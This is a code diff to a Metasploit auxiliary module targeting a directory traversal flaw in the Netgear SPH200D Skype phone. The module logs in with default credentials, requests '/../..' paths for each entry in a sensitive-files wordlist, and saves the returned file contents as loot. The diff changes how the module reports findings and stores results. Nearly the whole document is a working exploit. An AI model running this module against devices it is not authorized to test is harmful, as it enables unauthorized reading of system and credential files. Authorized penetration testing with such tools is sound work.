@@ -1,8 +1,4 @@
 ##
-# $Id: tomcat_utf8_traversal.rb 14975 2012-03-18 01:39:05Z rapid7 $
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -14,13 +10,11 @@ require 'msf/core'
 class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Remote::HttpClient
-	include Msf::Auxiliary::WmapScanServer
 	include Msf::Auxiliary::Scanner
 
 	def initialize
 		super(
 			'Name'        => 'Netgear SPH200D - Directory Traversal Vulnerability',
-			'Version'     => '$$',
 			'Description' => %q{
 				This module exploits a directory traversal vulnerablity which is present
 				in Netgear SPH200D Skype telephone 
@@ -35,45 +29,58 @@ class Metasploit3 < Msf::Auxiliary
 			'Author'      => [ 'm-1-k-3' ],
 			'License'     => MSF_LICENSE
 		)
-
 		register_options(
 			[
 				Opt::RPORT(80),
-				OptPath.new('SENSITIVE_FILES',  [ true, "File containing senstive files, one per line",
+				OptPath.new('FILELIST',  [ true, "File containing sensitive files, one per line",
 					File.join(Msf::Config.install_root, "data", "wordlists", "sensitive_files.txt") ]),
 				OptString.new('USERNAME',[ true, 'User to login with', 'admin']),
 				OptString.new('PASSWORD',[ true, 'Password to login with', 'password']),
-
 			], self.class)
 	end
 
 	def extract_words(wordfile)
-		return [] unless wordfile && File.readable?(wordfile)
-		begin
-			words = File.open(wordfile, "rb") do |f|
-				f.read
-		end
-		rescue
-			return []
-		end
-		save_array = words.split(/\r?\n/)
-		return save_array
+			return [] unless wordfile && File.readable?(wordfile)
+			begin
+					words = File.open(wordfile, "rb") do |f|
+							f.read
+					end
+			rescue
+					return []
+			end
+			save_array = words.split(/\r?\n/)
+			return save_array
 	end
 
-	def find_files(files,user,pass)
+	#traversal every file
+	def find_files(file,user,pass)
 		traversal = '/../..'
 
-		res = send_request_raw(
-			{
-				'method'  => 'GET',
-				'uri'     => traversal << files,
-				'basic_auth' => "#{user}:#{pass}"
+		res = send_request_cgi({
+			'method'  => 'GET',
+			'uri'     => traversal << file,
+			'basic_auth' => "#{user}:#{pass}"
+			})
+
+		if (res and res.code == 200 and res.body !~ /404\ File\ Not\ Found/)
+			print_good("Request may have succeeded on #{rhost}:#{rport}:file->#{file}! Response: \r\n #{res.body}")
+			report_web_vuln({
+				:host     => rhost,
+				:port     => rport,
+				:vhost    => datastore['VHOST'],
+				:path     => traversal << file,
+				:pname    => traversal,
+				:risk     => 3,
+				:proof    => traversal,
+				:name     => self.fullname,
+				:category => "web",
+				:method   => "GET"
 				})
-		if (res and res.code == 200)
-			print_status("Request may have succeeded on #{rhost}:#{rport}:file->#{files}! Response: \r\n")
-			print_status("#{res.body}")
+				
+				loot = store_loot("lfi.data","text/plain",rhost, res.body,file)
+				print_good("File #{file} downloaded to: #{loot}")
 		elsif (res and res.code)
-			vprint_error("Attempt returned HTTP error #{res.code} on #{rhost}:#{rport}:file->#{files}")
+			vprint_error("Attempt returned HTTP error #{res.code} and Body #{res.body} on #{rhost}:#{rport}:file->#{file}")
 		end
 	end
 
@@ -85,50 +92,43 @@ class Metasploit3 < Msf::Auxiliary
 			pass = datastore['PASSWORD']
 		end
 
-				print_status("Trying to login with #{user} / #{pass}")
-
-                begin
-                        res = send_request_cgi({
-                                'uri'     => '/',
-                                'method'  => 'GET',
-						  		'basic_auth' => "#{user}:#{pass}"
-								})
-
-						unless (res.kind_of? Rex::Proto::Http::Response)
-								vprint_error("#{target_url} not responding")
-						end
-
-						return :abort if (res.code == 404)
-
-						if [200, 301, 302].include?(res.code)
-							print_good("SUCCESSFUL LOGIN. '#{user}' : '#{pass}'")	
-						else
-							print_error("NO SUCCESSFUL LOGIN POSSIBLE. '#{user}' : '#{pass}'")	
-							return :abort
-						end
-
-				rescue ::Rex::ConnectionError
-						vprint_error("Failed to connect to the web server")
-						return :abort
-				end
-
+		print_status("Trying to login with #{user} / #{pass}")
+		
+		#test login
 		begin
-			print_status("Attempting to connect to #{rhost}:#{rport}")
-			res = send_request_raw(
-				{
+			res = send_request_cgi({
+					'uri'     => '/',
 					'method'  => 'GET',
-					'uri'	 => '/',
 					'basic_auth' => "#{user}:#{pass}"
-				})
+					})
 
-			if (res)
-				extract_words(datastore['SENSITIVE_FILES']).each do |files|
-					find_files(files,user,pass) unless files.empty?
-				end
+			return :abort if (res.code == 404)
+
+			if [200, 301, 302].include?(res.code)
+				vprint_good("Successful login: #{user} : #{pass} on #{rhost}:#{rport}")	
+			else
+				vprint_error("No successful login possible. #{user} : #{pass} on #{rhost}:#{rport}")
+				return :abort
 			end
 
-		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-		rescue ::Timeout::Error, ::Errno::EPIPE
+		rescue ::Rex::ConnectionError
+				vprint_error("Failed to connect to the web server")
+				return :abort
+		end
+
+		begin
+			vprint_status("Attempting to connect to #{rhost}:#{rport}")
+			res = send_request_cgi({
+					'uri'     => '/',
+					'method'  => 'GET',
+					'basic_auth' => "#{user}:#{pass}"
+					})
+			if (res)
+				extract_words(datastore['FILELIST']).each do |file|
+					find_files(file,user,pass) unless file.empty?
+				end
+			end
+				
 		end
 	end
 end
